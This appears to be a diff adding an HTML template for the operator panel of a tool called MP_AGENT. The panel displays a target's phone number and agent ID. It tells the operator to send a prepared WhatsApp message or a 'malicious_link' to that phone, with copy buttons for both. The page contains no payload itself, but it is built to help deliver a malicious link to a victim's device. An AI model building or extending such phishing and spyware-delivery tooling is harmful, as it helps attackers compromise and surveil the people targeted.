@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Deployment Ready - MP_AGENT</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: Arial; background: #1a1a1a; color: white; line-height: 1.6; padding: 20px; }
+        .container { max-width: 800px; margin: 0 auto; }
+        .success-card { background: linear-gradient(135deg, #28a745, #20c997); padding: 25px; border-radius: 12px; margin-bottom: 25px; box-shadow: 0 5px 20px rgba(40, 167, 69, 0.3); }
+        .info-card { background: #2d2d2d; padding: 25px; border-radius: 12px; margin-bottom: 20px; border-left: 4px solid #667eea; }
+        .link-box { background: #3d3d3d; padding: 20px; border-radius: 8px; margin: 15px 0; border: 1px solid #555; }
+        .link-input { width: 100%; padding: 12px; background: #2d2d2d; border: 1px solid #555; border-radius: 6px; color: white; font-family: monospace; font-size: 14px; margin-bottom: 10px; }
+        .btn { padding: 12px 25px; border: none; border-radius: 6px; cursor: pointer; font-size: 14px; font-weight: 600; transition: all 0.3s ease; }
+        .btn-copy { background: #667eea; color: white; }
+        .btn-copy:hover { background: #5a6fd8; }
+        .btn-back { background: #6c757d; color: white; text-decoration: none; display: inline-block; margin-top: 20px; }
+        .btn-back:hover { background: #5a6268; }
+        .notification { position: fixed; top: 20px; right: 20px; background: #28a745; color: white; padding: 15px 25px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.3); display: none; z-index: 1000; }
+    </style>
+</head>
+<body>
+    <div class="notification" id="notification">✅ Copied to clipboard!</div>
+
+    <div class="container">
+        <div class="success-card">
+            <h2>✅ Deployment Ready!</h2>
+            <p><strong>Target Phone:</strong> {{ target_phone }}</p>
+            <p><strong>Agent ID:</strong> {{ agent_id }}</p>
+            <p><strong>Status:</strong> <span style="color: #ffeb3b;">Ready for Deployment</span></p>
+        </div>
+        
+        <div class="info-card">
+            <h3>📱 Send WhatsApp Message</h3>
+            <p>Send this exact message to the target phone via WhatsApp:</p>
+            <div class="link-box">
+                <strong>{{ whatsapp_message }}</strong>
+            </div>
+            <button class="btn btn-copy" onclick="copyToClipboard('{{ whatsapp_message }}')">
+                📋 Copy Message
+            </button>
+        </div>
+        
+        <div class="info-card">
+            <h3>🔗 Direct Link</h3>
+            <p>Or send this link directly:</p>
+            <input type="text" class="link-input" value="{{ malicious_link }}" readonly id="directLink">
+            <button class="btn btn-copy" onclick="copyToClipboard('{{ malicious_link }}')">
+                📋 Copy Link
+            </button>
+        </div>
+        
+        <a href="/admin" class="btn btn-back">← Back to Dashboard</a>
+    </div>
+
+    <script>
+        function showNotification() {
+            const notification = document.getElementById('notification');
+            notification.style.display = 'block';
+            setTimeout(() => {
+                notification.style.display = 'none';
+            }, 3000);
+        }
+
+        function copyToClipboard(text) {
+            // Create a temporary textarea element
+            const textarea = document.createElement('textarea');
+            textarea.value = text;
+            textarea.style.position = 'fixed';
+            textarea.style.opacity = '0';
+            document.body.appendChild(textarea);
+            
+            // Select and copy the text
+            textarea.select();
+            textarea.setSelectionRange(0, 99999); // For mobile devices
+            
+            try {
+                const successful = document.execCommand('copy');
+                if (successful) {
+                    showNotification();
+                }
+            } catch (err) {
+                console.error('Failed to copy text: ', err);
+                // Fallback for modern browsers
+                navigator.clipboard.writeText(text).then(() => {
+                    showNotification();
+                }).catch(err => {
+                    alert('Copy failed. Please copy manually: ' + text);
+                });
+            }
+            
+            // Clean up
+            document.body.removeChild(textarea);
+        }
+
+        // Make the direct link input click-to-select
+        document.getElementById('directLink').addEventListener('click', function() {
+            this.select();
+        });
+    </script>
+</body>
+</html>
